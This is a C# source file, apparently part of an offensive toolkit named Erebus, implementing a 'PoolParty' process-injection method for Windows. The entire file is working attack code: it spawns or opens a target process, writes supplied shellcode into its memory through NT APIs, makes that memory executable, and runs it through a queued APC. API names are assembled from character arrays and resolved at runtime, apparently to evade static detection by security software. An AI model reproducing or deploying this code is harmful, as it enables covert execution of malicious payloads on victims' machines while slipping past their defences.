
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class PoolPartyInjection : IInjectionMethod
    {
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;
        public string Description => "Thread pool-based remote injection (APC-based hybrid variant)";
        public string Name => "PoolParty";

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;

            try
            {
                // If no PID specified, create a new process
                int pid;
                uint threadId = 0;

                if (targetPid == 0)
                {
                    DebugLogger.WriteLine("[*] Creating new target process (suspended)...");
                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    Win32.PROCESS_INFORMATION pi;

                    StringBuilder cmdLine = new StringBuilder(InjectionConfig.TargetProcess);

                    bool success = Win32.CreateProcess(
                        null!,
                        cmdLine,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                        IntPtr.Zero,
                        null!,
                        ref si,
                        out pi);

                    if (!success)
                    {
                        DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    hProcess = pi.hProcess;
                    hThread = pi.hThread;
                    pid = pi.dwProcessId;
                    threadId = (uint)pi.dwThreadId;
                    DebugLogger.WriteLine($"[+] Target process created with PID: {pid}, TID: {threadId}");
                }
                else
                {
                    DebugLogger.WriteLine($"[*] Opening target process PID: {targetPid}");
                    hProcess = DoOpenProcK(PROCESS_ALL_ACCESS, false, targetPid);

                    if (hProcess == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    // Find the main thread
                    Process proc = Process.GetProcessById(targetPid);
                    if (proc.Threads.Count == 0)
                    {
                        DebugLogger.WriteLine("[-] No threads found in target process");
                        return false;
                    }

                    threadId = (uint)proc.Threads[0].Id;
                    hThread = DoOpenThread(THREAD_ALL_ACCESS, false, threadId);

                    if (hThread == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open thread: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    pid = targetPid;
                    DebugLogger.WriteLine($"[+] Opened process PID: {pid}, using TID: {threadId}");
                }

                // Allocate memory for shellcode using NT API
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr regionSize = new IntPtr(shellcode.Length);

                uint status = DoAlloc(
                    hProcess,
                    ref baseAddress,
                    IntPtr.Zero,
                    ref regionSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] alloc step failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                uint written;
                status = DoWrite(
                    hProcess,
                    baseAddress,
                    shellcode,
                    (uint)shellcode.Length,
                    out written);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] write step failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Written {written} bytes to target process");

                // Change protection to executable
                IntPtr protectAddress = baseAddress;
                IntPtr protectSize = new IntPtr(shellcode.Length);
                uint oldProtect;

                status = DoProtect(
                    hProcess,
                    ref protectAddress,
                    ref protectSize,
                    PAGE_EXECUTE_READ,
                    out oldProtect);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] protect step failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine("[+] Memory protection changed to RX");

                // Allocate space for a fake TP_WORK structure (for future pool hijacking) This is
                // optional and demonstrates the "pool party" concept
                IntPtr tpWorkAddress = IntPtr.Zero;
                IntPtr tpWorkSize = new IntPtr(0x200);

                status = DoAlloc(
                    hProcess,
                    ref tpWorkAddress,
                    IntPtr.Zero,
                    ref tpWorkSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                if (status == 0)
                {
                    DebugLogger.WriteLine($"[+] Allocated TP_WORK structure at: 0x{tpWorkAddress:X}");

                    // Create a fake TP_WORK structure pointing to shellcode
                    byte[] fakeTPWork = new byte[0x200];
                    // Set callback pointer at offset 0x30 (Windows 10/11)
                    byte[] addressBytes = BitConverter.GetBytes(baseAddress.ToInt64());
                    Array.Copy(addressBytes, 0, fakeTPWork, 0x30, addressBytes.Length);

                    status = DoWrite(
                        hProcess,
                        tpWorkAddress,
                        fakeTPWork,
                        (uint)fakeTPWork.Length,
                        out written);

                    if (status == 0)
                    {
                        DebugLogger.WriteLine("[+] Fake TP_WORK structure written");
                    }
                }

                // Queue APC to execute shellcode This is the actual execution method (APC-based hybrid)
                status = DoQueueApc(
                    hThread,
                    baseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] apc-queue step failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine("[+] APC queued to thread pool worker");

                // Resume the thread to execute the APC
                uint suspendCount;
                status = DoResume(hThread, out suspendCount);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] resume step failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Thread resumed (previous suspend count: {suspendCount})");
                DebugLogger.WriteLine("[+] PoolParty injection completed successfully");

                // Give shellcode time to execute
                System.Threading.Thread.Sleep(2000);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] PoolParty injection failed: {ex.Message}");
                DebugLogger.WriteLine($"    Stack trace: {ex.StackTrace}");
                return false;
            }
            finally
            {
                // Cleanup handles
                if (hThread != IntPtr.Zero)
                {
                    DoClose(hThread);
                }
                if (hProcess != IntPtr.Zero)
                {
                    DoClose(hProcess);
                }
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnAvm(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnCl(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnNop(
            out IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnPvm(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnQat(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnRt(
            IntPtr ThreadHandle,
            out uint SuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnWvm(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            uint BufferLength,
            out uint NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnOp(uint processAccess, bool bInheritHandle, int processId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnOt(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        private static readonly Lazy<FnAvm> _ntAlloc =
            Evasion.DynamicApi.LazyDelegate<FnAvm>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
        private static readonly Lazy<FnCl> _ntClose =
            Evasion.DynamicApi.LazyDelegate<FnCl>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'C', 'l', 'o', 's', 'e' });
        private static readonly Lazy<FnNop> _ntOpenProc =
            Evasion.DynamicApi.LazyDelegate<FnNop>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
        private static readonly Lazy<FnPvm> _ntProtect =
            Evasion.DynamicApi.LazyDelegate<FnPvm>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
        private static readonly Lazy<FnQat> _ntQueueApc =
            Evasion.DynamicApi.LazyDelegate<FnQat>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd' });
        private static readonly Lazy<FnRt> _ntResume =
            Evasion.DynamicApi.LazyDelegate<FnRt>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd' });
        private static readonly Lazy<FnWvm> _ntWrite =
            Evasion.DynamicApi.LazyDelegate<FnWvm>(
                Evasion.DynamicApi.Ntdll,
                new[] { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
        private static readonly Lazy<FnOp> _openProc =
            Evasion.DynamicApi.LazyDelegate<FnOp>(
                Evasion.DynamicApi.Kernel32,
                new[] { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
        private static readonly Lazy<FnOt> _openThread =
            Evasion.DynamicApi.LazyDelegate<FnOt>(
                Evasion.DynamicApi.Kernel32,
                new[] { 'O', 'p', 'e', 'n', 'T', 'h', 'r', 'e', 'a', 'd' });

        private static uint DoAlloc(IntPtr p, ref IntPtr b, IntPtr z, ref IntPtr r, uint a, uint pr)
            => _ntAlloc.Value(p, ref b, z, ref r, a, pr);
        private static uint DoClose(IntPtr h) => _ntClose.Value(h);
        private static uint DoOpenProc(out IntPtr ph, uint da, ref OBJECT_ATTRIBUTES oa, ref CLIENT_ID ci)
            => _ntOpenProc.Value(out ph, da, ref oa, ref ci);
        private static uint DoProtect(IntPtr p, ref IntPtr b, ref IntPtr r, uint n, out uint o)
            => _ntProtect.Value(p, ref b, ref r, n, out o);
        private static uint DoQueueApc(IntPtr t, IntPtr r, IntPtr a1, IntPtr a2, IntPtr a3)
            => _ntQueueApc.Value(t, r, a1, a2, a3);
        private static uint DoResume(IntPtr t, out uint s) => _ntResume.Value(t, out s);
        private static uint DoWrite(IntPtr p, IntPtr b, byte[] buf, uint len, out uint wrote)
            => _ntWrite.Value(p, b, buf, len, out wrote);
        private static IntPtr DoOpenProcK(uint a, bool b, int c) => _openProc.Value(a, b, c);
        private static IntPtr DoOpenThread(uint a, bool b, uint c) => _openThread.Value(a, b, c);

        [StructLayout(LayoutKind.Sequential)]
        private struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
    }
}
